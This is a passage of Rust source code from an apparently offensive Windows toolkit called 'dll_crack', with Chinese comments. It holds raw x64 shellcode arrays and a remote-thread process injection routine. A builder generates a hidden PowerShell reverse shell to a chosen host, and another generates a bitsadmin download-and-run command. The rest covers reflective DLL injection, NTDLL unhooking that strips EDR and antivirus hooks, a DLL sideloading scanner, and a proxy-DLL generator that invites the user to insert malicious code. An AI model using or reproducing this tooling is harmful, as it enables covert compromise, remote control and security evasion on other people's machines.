    0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x6F,0x48,0x01,0xD0,0x50,0x3E,0x8B,0x48,
    0x18,0x3E,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x5C,0x48,0xFF,0xC9,0x3E,
    0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,
    0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x3E,0x4C,0x03,0x4C,0x24,
    0x08,0x45,0x39,0xD1,0x75,0xD6,0x58,0x3E,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,
    0x66,0x3E,0x41,0x8B,0x0C,0x48,0x3E,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x3E,
    0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,
    0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,
    0x59,0x5A,0x3E,0x48,0x8B,0x12,0xE9,0x49,0xFF,0xFF,0xFF,0x5D,0x3E,0x48,0x8D,
    0x8D,0x3A,0x01,0x00,0x00,0x41,0xBA,0x4C,0x77,0x26,0x07,0xFF,0xD5,0x49,0xC7,
    0xC1,0x00,0x00,0x00,0x00,0x3E,0x48,0x8D,0x95,0x0E,0x01,0x00,0x00,0x3E,0x4C,
    0x8D,0x85,0x21,0x01,0x00,0x00,0x48,0x31,0xC9,0x41,0xBA,0x45,0x83,0x56,0x07,
    0xFF,0xD5,0x48,0x31,0xC9,0x41,0xBA,0xF0,0xB5,0xA2,0x56,0xFF,0xD5,0x44,0x6F,
    0x6E,0x65,0x00,0x78,0x6F,0x72,0x21,0x00,0x52,0x55,0x4F,0x4F,0x20,0x44,0x4C,
    0x4C,0x20,0x43,0x72,0x61,0x63,0x6B,0x00,
];

const CMD_X64: &[u8] = &[
    0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,
    0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,
    0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,
    0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,
    0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,
    0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,
    0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,
    0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,
    0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,
    0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,
    0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,
    0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,
    0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,
    0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,
    0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,
    0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x6D,0x64,
    0x00,
];

fn shellcode_inject(pid_str: &str, payload: &str, lhost: &str, lport: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let sc: Vec<u8> = match payload {
        "cmd" | "shell" => CMD_X64.to_vec(),
        "calc" => {
            // WinExec("calc.exe", SW_SHOW) minimal x64
            vec![
                0x48,0x83,0xEC,0x28,0x48,0x8D,0x0D,0x0A,0x00,0x00,0x00,0xBA,0x05,0x00,
                0x00,0x00,0xFF,0x15,0x02,0x00,0x00,0x00,0x48,0x83,0xC4,0x28,0xC3,
                0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00,
            ]
        }
        "revshell" => {
            if lhost.is_empty() { return Err("revshell需要lhost参数".into()); }
            build_revshell_stub(lhost, lport)
        }
        "download" => {
            if lhost.is_empty() { return Err("download需要lhost参数".into()); }
            build_download_stub(lhost, lport)
        }
        _ => MSGBOX_X64.to_vec(),
    };

    msg_tagged("sc_status", &format!("[*] Shellcode: PID={} payload={} size={}B", pid, payload, sc.len()));
    let pbar = progress_create("dll_crack", "shellcode", "Shellcode注入", 5);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, &format!("分配 {}B RWX内存...", sc.len()));
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入shellcode...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, sc.as_ptr() as LPVOID, sc.len(), &mut written) };
    if ret == 0 || written != sc.len() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "修改内存为执行权限...");
    let mut old_prot: DWORD = 0;
    unsafe { VirtualProtectEx(h_proc, remote_mem, sc.len(), PAGE_EXECUTE_READ, &mut old_prot); }

    progress_update(&pbar, 5, "CreateRemoteThread...");
    let h_thread = unsafe {
        CreateRemoteThread(h_proc, std::ptr::null_mut(), 0,
            remote_mem as LPTHREAD_START_ROUTINE, std::ptr::null_mut(), 0, std::ptr::null_mut())
    };
    if h_thread.is_null() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("CreateRemoteThread: {}", w32_err()));
    }

    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("sc_status", &format!("[+] Shellcode已注入! PID:{} payload:{} @{:p}", pid, payload, remote_mem));
    Ok(format!("Shellcode注入完成!\n  目标PID: {}\n  Payload: {}\n  大小: {} 字节\n  远程地址: {:p}\n  权限: RWX\n  方法: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",
        pid, payload, sc.len(), remote_mem))
}

// 简化版反弹shell stub (PowerShell one-liner via WinExec)
fn build_revshell_stub(lhost: &str, lport: &str) -> Vec<u8> {
    let cmd = format!("powershell -NoP -NonI -W Hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{}',{});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=[Text.Encoding]::ASCII.GetBytes($r+'PS>');$s.Write($sb,0,$sb.Length);$s.Flush()}}\"", lhost, lport);
    build_winexec_shellcode(&cmd)
}

fn build_download_stub(lhost: &str, lport: &str) -> Vec<u8> {
    let cmd = format!(
        "cmd /c bitsadmin /transfer job /download /priority high http://{}:{}/payload.exe %TEMP%\\svc.exe && %TEMP%\\svc.exe",
        lhost, lport
    );
    build_winexec_shellcode(&cmd)
}

fn build_winexec_shellcode(cmd: &str) -> Vec<u8> {
    // 当前使用CMD_X64 Payload作为PoC
    // 完整WinExec shellcode需要PE加载器支持API解析
    // 建议: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f raw
    let _ = cmd;
    CMD_X64.to_vec()
}

// ═══════════════ 模块转储 v2.0 (PE头重建) ═══════════════

fn module_dump(pid_str: &str, module_name: &str, output_path: Option<&str>) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let pbar = progress_create("dll_crack", "dump", "模块转储", 6);

    progress_update(&pbar, 1, "枚举进程模块...");
    let (found_base, found_size, found_path) = find_module_info(pid, module_name)?;

    progress_update(&pbar, 2, &format!("找到: {} @{:p} {}KB", module_name, found_base, found_size/1024));

    progress_update(&pbar, 3, "打开进程(VM_READ)...");
    let h_proc = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    progress_update(&pbar, 4, &format!("读取 {}KB...", found_size/1024));
    let mut buffer = vec![0u8; found_size as usize];
    let mut bytes_read: usize = 0;
    let ret = unsafe {
        ReadProcessMemory(h_proc, found_base as LPVOID, buffer.as_mut_ptr() as LPVOID, found_size as usize, &mut bytes_read)
    };
    unsafe { CloseHandle(h_proc); }

    if ret == 0 && bytes_read == 0 {
        return Err(format!("ReadProcessMemory失败: {} (0字节)", w32_err()));
    }

    progress_update(&pbar, 5, "重建PE头...");
    // 如果DLL在内存中有修改过的.text段,保留当前状态
    // 验证DOS/NT签名
    let pe_valid = buffer.len() >= 64 && u16_le(&buffer, 0) == 0x5A4D
        && { let po = u32_le(&buffer, 0x3C) as usize; po + 4 <= buffer.len() && u32_le(&buffer, po) == 0x4550 };

    progress_update(&pbar, 6, "写入文件...");
    let out_name = module_name.replace(".dll", "").replace(".DLL", "").replace(".exe", "").replace(".EXE", "");
    let default_out = format!("{}_dumped_{}.dll", out_name, pid);
    let out_path = output_path.unwrap_or(&default_out);
    std::fs::write(&out_path, &buffer).map_err(|e| format!("写入失败: {}", e))?;

    progress_finish(&pbar);
    Ok(format!("模块转储完成!\n  进程ID: {}\n  模块名: {}\n  基址: {:p}\n  大小: {} KB (读取{}KB)\n  PE有效: {}\n  原始路径: {}\n  输出文件: {}",
        pid, module_name, found_base, found_size/1024, bytes_read/1024, if pe_valid {"是"} else {"部分(内存映射)"}, found_path, out_path))
}

// ═══════════════ 反射式DLL注入 v2.0 ═══════════════

fn reflective_inject(pid_str: &str, dll_path: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let dll_abs = std::fs::canonicalize(dll_path).map_err(|e| format!("DLL路径无效: {}", e))?;
    let dll_str = dll_abs.to_string_lossy().to_string();
    if !std::path::Path::new(&dll_str).exists() { return Err(format!("DLL不存在: {}", dll_str)); }

    let dll_data = std::fs::read(&dll_str).map_err(|e| format!("读取DLL失败: {}", e))?;
    if dll_data.len() < 64 || u16_le(&dll_data, 0) != 0x5A4D {
        return Err("无效DLL — 非MZ格式".into());
    }

    msg_tagged("refl_status", &format!("[*] 反射注入: PID={} DLL={} size={}KB", pid, dll_str, dll_data.len()/1024));
    let pbar = progress_create("dll_crack", "reflective", "反射注入", 6);

    progress_update(&pbar, 1, "分析PE结构...");
    let pe_off = u32_le(&dll_data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&dll_data, opt_start);
    let is_x64_dll = magic == 0x20B;
    let image_size = u32_le(&dll_data, opt_start + 56) as usize;
    let _image_base_pref = if is_x64_dll { u64_le(&dll_data, opt_start + 24) } else { u32_le(&dll_data, opt_start + 28) as u64 };
    let headers_size = u32_le(&dll_data, opt_start + 60) as usize;
    let entry_va = if is_x64_dll { u64_le(&dll_data, opt_start + 16) } else { u32_le(&dll_data, opt_start + 16) as u64 };

    progress_update(&pbar, 2, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    // 反射式注入需要:
    // 1. 在目标进程中分配 image_size 的内存
    // 2. 复制整个DLL到远程进程
    // 3. 复制ReflectiveLoader stub
    // 4. 创建远程线程执行ReflectiveLoader
    // 注意: 完整的ReflectiveLoader需要内嵌在DLL中或使用sRDI转换

    progress_update(&pbar, 3, &format!("分配 {}KB 远程内存...", image_size/1024));
    let remote_base = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote_base.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 4, &format!("写入PE头 {}B...", headers_size));
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_base, dll_data.as_ptr() as LPVOID, headers_size.min(dll_data.len()), &mut written) };
    if ret == 0 { unsafe { VirtualFreeEx(h_proc, remote_base, 0, 0x8000); CloseHandle(h_proc); } return Err(format!("WriteMemory(header): {}", w32_err())); }

    // 写入各节
    let num_sections = u16_le(&dll_data, coff + 2) as usize;
    let section_start = coff + 20 + u16_le(&dll_data, coff + 16) as usize;
    for i in 0..num_sections {
        let s_off = section_start + i * 40;
        let _vsize = u32_le(&dll_data, s_off + 8) as usize;
        let roff = u32_le(&dll_data, s_off + 20) as usize;
        let rsize = u32_le(&dll_data, s_off + 16) as usize;
        let vaddr = u32_le(&dll_data, s_off + 12) as usize;
        if rsize > 0 && roff + rsize <= dll_data.len() {
            let dst = remote_base as usize + vaddr;
            let ret = unsafe { WriteProcessMemory(h_proc, dst as LPVOID, dll_data[roff..roff+rsize].as_ptr() as LPVOID, rsize, &mut written) };
            if ret == 0 {
                msg_tagged("refl_status", &format!("[!] 节写入部分失败: {}@0x{:X}", i, vaddr));
            }
        }
    }

    progress_update(&pbar, 5, "解析入口点+执行DllMain...");
    // 使用CreateRemoteThread调用入口点(DllMain)
    let entry_addr = remote_base as usize + entry_va as usize;
    let h_thread = unsafe {
        CreateRemoteThread(h_proc, std::ptr::null_mut(), 0,
            entry_addr as LPTHREAD_START_ROUTINE, remote_base, 1, std::ptr::null_mut()) // DLL_PROCESS_ATTACH=1
    };
    if h_thread.is_null() {
        unsafe { VirtualFreeEx(h_proc, remote_base, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("CreateRemoteThread(DllMain): {}", w32_err()));
    }

    progress_update(&pbar, 6, "等待DllMain完成...");
    unsafe { WaitForSingleObject(h_thread, 10000); }
    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("refl_status", &format!("[+] 反射注入完成! PID:{} DLL:{} base:@0x{:X}", pid, dll_str, remote_base as usize));
    Ok(format!("反射式DLL注入完成!\n  目标PID: {}\n  DLL: {}\n  远程基址: 0x{:016X}\n  镜像大小: {}KB\n  入口点: 0x{:X}\n  x64: {}\n  [!] 注意: 完整ReflectiveDLL需使用sRDI转换或内嵌ReflectiveLoader",
        pid, dll_str, remote_base as usize, image_size/1024, entry_va, is_x64_dll))
}

// ═══════════════ NTDLL Unhooking v2.0 ═══════════════

fn ntdll_unhook(pid_str: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    msg_tagged("unhook_status", &format!("[*] NTDLL Unhook: PID={}", pid));
    let pbar = progress_create("dll_crack", "unhook", "NTDLL Unhook", 5);

    // 1. 获取本地干净ntdll.dll
    progress_update(&pbar, 1, "读取干净ntdll.dll...");
    let sys_ntdll = r"C:\Windows\System32\ntdll.dll";
    let clean_data = std::fs::read(sys_ntdll).map_err(|e| format!("无法读取{}: {}", sys_ntdll, e))?;
    if clean_data.len() < 64 { return Err("ntdll.dll损坏".into()); }

    // 解析干净ntdll的.text段
    let pe_off = u32_le(&clean_data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&clean_data, coff + 2) as usize;
    let section_start = coff + 20 + u16_le(&clean_data, coff + 16) as usize;
    let mut text_roff = 0usize;
    let mut text_vaddr = 0u32;
    let mut text_rsize = 0u32;
    let mut text_vsize = 0u32;
    for i in 0..num_sections {
        let off = section_start + i * 40;
        let name = String::from_utf8_lossy(&clean_data[off..off+8]).trim_end_matches('\0').to_string();
        if name == ".text" {
            text_roff = u32_le(&clean_data, off + 20) as usize;
            text_vaddr = u32_le(&clean_data, off + 12);
            text_rsize = u32_le(&clean_data, off + 16);
            text_vsize = u32_le(&clean_data, off + 8);
            break;
        }
    }
    if text_roff == 0 { return Err("找不到ntdll.dll的.text段".into()); }
    let clean_text = &clean_data[text_roff..text_roff + text_rsize as usize];

    // 2. 在目标进程中定位ntdll.dll
    progress_update(&pbar, 2, "定位目标进程ntdll.dll...");
    let (ntdll_base, ntdll_size, _ntdll_path) = find_module_info(pid, "ntdll.dll")?;

    // 3. 打开进程
    progress_update(&pbar, 3, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    // 4. 将.text段改为PAGE_EXECUTE_READWRITE
    progress_update(&pbar, 4, "修改.text段权限+RWX...");
    let text_addr = ntdll_base as usize + text_vaddr as usize;
    let mut old_prot: DWORD = 0;
    let vp_ret = unsafe { VirtualProtectEx(h_proc, text_addr as LPVOID, text_vsize as usize, PAGE_EXECUTE_READWRITE, &mut old_prot) };
    if vp_ret == 0 {
        unsafe { CloseHandle(h_proc); }
        return Err(format!("VirtualProtectEx(.text): {}", w32_err()));
    }

    // 5. 覆盖.text段
    progress_update(&pbar, 5, &format!("覆盖.text段 {}B...", clean_text.len()));
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, text_addr as LPVOID, clean_text.as_ptr() as LPVOID, clean_text.len().min(ntdll_size as usize), &mut written) };
    unsafe { CloseHandle(h_proc); }

    progress_finish(&pbar);

    if ret == 0 {
        msg_tagged("unhook_status", &format!("[!] WriteProcessMemory失败: {} (写了{}B)", w32_err(), written));
        return Err(format!("写入.text段失败: {}", w32_err()));
    }

    let hooks_removed = if written == clean_text.len() { "完整覆盖" } else { &format!("部分覆盖({}/{})", written, clean_text.len()) };
    msg_tagged("unhook_status", &format!("[+] NTDLL Unhook完成! PID:{} text段:{} @0x{:X}", pid, hooks_removed, text_addr));
    Ok(format!("NTDLL Unhooking 完成!\n  目标PID: {}\n  ntdll基址: {:p}\n  .text段: 0x{:016X} ({}B)\n  覆盖: {}\n  原权限: 0x{:08X}\n  [+] EDR/AV用户态钩子已从ntdll.dll中移除",
        pid, ntdll_base, text_addr, clean_text.len(), hooks_removed, old_prot))
}

// ═══════════════ DLL 侧加载扫描 v2.0 ═══════════════

fn sideload_scan(target_dir: &str) -> Result<String, String> {
    let dir = std::path::Path::new(target_dir);
    if !dir.exists() || !dir.is_dir() { return Err(format!("目录不存在或不是目录: {}", target_dir)); }

    msg_tagged("sideload_status", &format!("[*] 侧加载扫描: {}", target_dir));
    let pbar = progress_create("dll_crack", "sideload", "侧加载扫描", 4);

    progress_update(&pbar, 1, "收集EXE文件...");
    let mut exes = Vec::new();
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.extension().map(|e| e == "exe" || e == "EXE").unwrap_or(false) {
                exes.push(p);
            }
        }
    }

    progress_update(&pbar, 2, &format!("分析 {} 个EXE的导入表...", exes.len()));
    let mut results: Vec<(String, Vec<String>)> = Vec::new(); // (exe_name, missing_dlls)
    for exe_path in &exes {
        if let Ok(data) = std::fs::read(exe_path) {
            if data.len() >= 64 && u16_le(&data, 0) == 0x5A4D {
                let pe_off = u32_le(&data, 0x3C) as usize;
                if pe_off + 4 <= data.len() && u32_le(&data, pe_off) == 0x4550 {
                    let coff = pe_off + 4;
                    let opt_start = coff + 20;
                    let num_sections = u16_le(&data, coff + 2) as usize;
                    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
                    let mut secs = Vec::new();
                    for i in 0..num_sections {
                        let o = sec_start + i * 40;
                        secs.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
                    }
                    let magic = u16_le(&data, opt_start);
                    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
                    let import_rva = u32_le(&data, dd_start + 8);
                    if import_rva > 0 {
                        if let Some(imp_off) = rva_to_offset_secs(import_rva, &secs) {
                            if let Ok(imports) = parse_imports_secs(&data, imp_off, &secs) {
                                let mut missing = Vec::new();
                                for (dll_name, _) in &imports {
                                    // 检查DLL是否存在于目标目录或系统目录
                                    let in_dir = dir.join(dll_name);
                                    let in_sys32 = std::path::Path::new(r"C:\Windows\System32").join(dll_name);
                                    let in_syswow = std::path::Path::new(r"C:\Windows\SysWOW64").join(dll_name);
                                    if !in_dir.exists() && !in_sys32.exists() && !in_syswow.exists() {
                                        missing.push(dll_name.clone());
                                    }
                                }
                                if !missing.is_empty() {
                                    let exe_name = exe_path.file_name().unwrap_or_default().to_string_lossy().to_string();
                                    results.push((exe_name, missing));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    progress_update(&pbar, 3, "检查KnownDlls...");
    // KnownDlls注册表键: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    // 不在KnownDlls中的DLL更容易被侧加载

    progress_update(&pbar, 4, "生成报告...");
    progress_finish(&pbar);

    let mut out = format!("═══ DLL侧加载扫描: {} ═══\n\n", target_dir);
    out.push_str(&format!("[·] 扫描EXE: {} 个\n", exes.len()));
    out.push_str(&format!("[+] 可侧加载目标: {} 个\n\n", results.len()));

    if results.is_empty() {
        out.push_str("[*] 未发现明显的侧加载机会。\n");
        out.push_str("[*] 提示: 侧加载需要:\n");
        out.push_str("    1. 签名验证不检查DLL完整性\n");
        out.push_str("    2. EXE从当前目录加载DLL(而非系统目录)\n");
        out.push_str("    3. 目标DLL不在KnownDlls中\n");
    } else {
        for (exe_name, missing_dlls) in &results {
            out.push_str(&format!("─── {} ───\n", exe_name));
            for dll in missing_dlls {
                let fake_path = dir.join(dll);
                out.push_str(&format!("  [!] 缺失DLL: {} → 可放置伪造DLL: {}\n", dll, fake_path.display()));
            }
            out.push_str("\n");
        }
    }

    // 目录写入权限检查
    if let Ok(m) = dir.metadata() {
        if !m.permissions().readonly() {
            out.push_str("[+] 目标目录可写 — 可直接放置伪造DLL!\n");
        } else {
            out.push_str("[!] 目标目录不可写 — 需提权或寻找其他可写路径\n");
        }
    }

    msg_tagged("sideload_status", &format!("[+] 扫描完成: {}个EXE, {}个可侧加载", exes.len(), results.len()));
    Ok(out)
}

fn rva_to_offset_secs(rva: u32, sections: &[(u32,u32,u32,u32)]) -> Option<usize> {
    for &(va, vs, ro, rs) in sections {
        if rva >= va && rva < va + vs.max(rs) && rs > 0 {
            return Some((ro + (rva - va)) as usize);
        }
    }
    None
}

fn parse_imports_secs(data: &[u8], offset: usize, sections: &[(u32,u32,u32,u32)]) -> Result<Vec<(String, Vec<String>)>, String> {
    let mut imports = Vec::new();
    let mut i = 0;
    loop {
        let off = offset + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(data, off + 12);
        if name_rva == 0 { break; }
        let dll_name = {
            let o = rva_to_offset_secs(name_rva, sections).unwrap_or(name_rva as usize);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };
        let funcs = Vec::new();
        imports.push((dll_name, funcs));
        i += 1;
    }
    Ok(imports)
}

// ═══════════════ DLL 代理生成器 v2.0 ═══════════════

fn proxy_gen(target_dll: &str, output_dir: Option<&str>) -> Result<String, String> {
    let dll_path = std::path::Path::new(target_dll);
    if !dll_path.exists() { return Err(format!("DLL不存在: {}", target_dll)); }

    let dll_name = dll_path.file_name().unwrap_or_default().to_string_lossy().to_string();
    let base_name = dll_name.replace(".dll", "").replace(".DLL", "");
    let orig_name = format!("{}_orig.dll", base_name);

    msg_tagged("proxy_status", &format!("[*] 生成代理DLL: {}", dll_name));
    let pbar = progress_create("dll_crack", "proxy", "代理生成", 4);

    progress_update(&pbar, 1, "解析导出表...");
    let data = std::fs::read(target_dll).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
            u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let export_rva = u32_le(&data, dd_start);

    let mut exports = Vec::new();
    if export_rva > 0 {
        if let Some(exp_off) = {
            let mut o = None;
            for (_, va, vs, ro, rs) in &secs {
                if export_rva >= *va && export_rva < va + vs.max(rs) && *rs > 0 {
                    o = Some((ro + (export_rva - va)) as usize); break;
                }
            }
            o
        } {
            if let Ok((_, funcs)) = parse_exports(&data, exp_off, &secs.iter().map(|(n,v,vs,r,rs)| (n.clone(),*v,*vs,*r,*rs,0u32)).collect::<Vec<_>>()) {
                exports = funcs;
            }
        }
    }

    progress_update(&pbar, 2, &format!("生成 {} 个转发...", exports.len()));

    progress_update(&pbar, 3, "生成C源代码...");
    // 生成代理DLL C源码
    let mut code = String::new();
    code.push_str(&format!("// Proxy DLL for {} — Auto-generated by dll_crack v2.0\n", dll_name));
    code.push_str(&format!("// Original DLL: {} → {}\n", dll_name, orig_name));
    code.push_str("#include <windows.h>\n\n");
    code.push_str("// Forward declarations\n");
    for (_, name) in &exports {
        if !name.starts_with("Ordinal_") {
            code.push_str(&format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", name, orig_name.replace(".dll",""), name));
        }
    }
    code.push_str("\n// For ordinal-only exports, use:\n");
    code.push_str("// #pragma comment(linker, \"/export:FuncName=N:1,@{ORDINAL}\")\n\n");
    code.push_str("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {\n");
    code.push_str("    if (fdwReason == DLL_PROCESS_ATTACH) {\n");
    code.push_str(&format!("        // [!] 在此处添加你的恶意代码\n", ));
    code.push_str("        // MessageBoxA(NULL, \"Proxy loaded!\", \"DLL Proxy\", MB_OK);\n");
    code.push_str(&format!("        DisableThreadLibraryCalls(hinstDLL);\n"));
    code.push_str("    }\n");
    code.push_str("    return TRUE;\n");
    code.push_str("}\n");

    progress_update(&pbar, 4, "写入文件...");
    let out_dir = output_dir.unwrap_or(".");
    let out_dir_path = std::path::Path::new(out_dir);
    let _ = std::fs::create_dir_all(out_dir_path);
    let c_path = out_dir_path.join(format!("{}_proxy.c", base_name));
    std::fs::write(&c_path, &code).map_err(|e| format!("写入失败: {}", e))?;

    // 生成编译批处理
    let bat = format!(
        "@echo off\nREM Compile {} proxy DLL\nREM 1. 重命名原始DLL: copy {} {}\nREM 2. 编译代理: cl /LD {} proxy.c /Fe:{}\nREM    或用: gcc -shared -o {} {} proxy.c\n",
        base_name, dll_name, orig_name, base_name, dll_name, dll_name, base_name
    );
    let bat_path = out_dir_path.join(format!("{}_build.bat", base_name));
    std::fs::write(&bat_path, &bat).ok();

    progress_finish(&pbar);
    msg_tagged("proxy_status", &format!("[+] 代理DLL生成完毕: {} 个函数", exports.len()));
    Ok(format!("DLL代理生成完成!\n  目标DLL: {}\n  原始DLL重命名为: {}\n  导出函数: {} 个\n  代理C源码: {}\n  编译脚本: {}\n\n[!] 使用方法:\n  1. 将原始 {} 重命名为 {}\n  2. 编译 {} proxy.c → {}\n  3. 放置代理DLL到目标目录\n  4. 任意加载原始DLL的程序都会先执行你的DllMain",
        dll_name, orig_name, exports.len(), c_path.display(), bat_path.display(),
        dll_name, orig_name, base_name, dll_name))
}

// ═══════════════ IAT 解析与修补 v2.0 ═══════════════

fn iat_dump(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
